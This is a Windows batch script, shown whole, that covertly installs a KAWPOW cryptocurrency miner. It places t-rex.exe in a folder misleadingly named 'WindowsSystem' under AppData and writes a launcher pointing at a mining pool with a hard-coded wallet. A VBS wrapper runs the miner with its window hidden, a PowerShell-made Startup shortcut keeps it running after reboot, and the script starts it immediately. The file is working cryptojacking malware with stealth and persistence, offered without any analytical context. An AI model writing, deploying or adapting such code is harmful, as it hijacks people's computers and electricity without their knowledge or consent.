@echo off
setlocal

:: Define script and miner paths
set "MINER_DIR=%APPDATA%\WindowsSystem"
set "MINER_SCRIPT=%MINER_DIR%\miner.bat"
set "VBS_SCRIPT=%MINER_DIR%\run_hidden.vbs"
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
set "T_REX_EXEC=%MINER_DIR%\t-rex.exe"

:: Create necessary directories
mkdir "%MINER_DIR%" 2>nul

:: Ensure t-rex.exe exists
if not exist "%T_REX_EXEC%" (
    echo ERROR: t-rex.exe not found in "%MINER_DIR%"! > "%MINER_DIR%\miner_error.log"
    exit /b
)

:: Write miner script
(
    echo @echo off
    echo cd /d "%MINER_DIR%"  ^&^& start /b "" "%T_REX_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
) > "%MINER_SCRIPT%"

:: Write VBS script to run miner in hidden mode
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run """%MINER_SCRIPT%""", 0, False
) > "%VBS_SCRIPT%"

:: Create a shortcut in the Startup folder
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"

:: Run miner immediately
wscript "%VBS_SCRIPT%"

exit
